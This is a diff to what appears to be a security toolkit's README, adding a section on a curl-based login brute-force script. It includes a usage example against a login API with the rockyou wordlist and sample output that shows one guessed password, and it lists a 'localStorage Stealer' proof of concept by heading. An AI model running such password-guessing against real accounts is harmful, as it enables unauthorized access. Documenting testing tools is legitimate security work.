@@ -94,6 +94,25 @@ Example
 ./analyze.sh
 
 
+
+# Simple brute force script using curl with automation
+
+
+Example
+
+./login-bruteforce.sh -u "http://secb/api/Auth/Login" -U "adomin@ssrd.io" -P /usr/share/wordlists/rockyou.txt
+
+output:
+
+    Failed login with Username: adomin@ssrd.io Password: matthew (HTTP status: 400)
+    Failed login with Username: adomin@ssrd.io Password: robert (HTTP status: 400)
+    Success! Username: adomin@ssrd.io Password: snailmail
+    Failed login with Username: adomin@ssrd.io Password: eminem (HTTP status: 400)
+    Failed login with Username: adomin@ssrd.io Password: matthew (HTTP status: 400)
+    Failed login with Username: adomin@ssrd.io Password: robert (HTTP status: 400)
+
+
+
 ## Proof of concept of localStorage Stealer
 
     ## Usage
